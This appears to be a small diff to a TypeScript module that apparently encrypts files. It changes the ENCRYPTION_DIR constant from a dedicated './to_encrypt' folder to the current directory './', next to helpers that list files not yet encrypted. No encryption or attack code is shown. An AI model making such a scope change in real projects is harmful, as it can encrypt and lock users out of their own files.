@@ -1,8 +1,7 @@
 import { getFiles, getFilesNotEncr, sampleN, FileEntry } from "./helpers";
 import fs from 'fs';
 
-const ENCRYPTION_DIR = './to_encrypt';
-
+const ENCRYPTION_DIR = './';
 
 export interface Rats {
     listIncentives: (count: number) => Promise<FileEntry[]>,
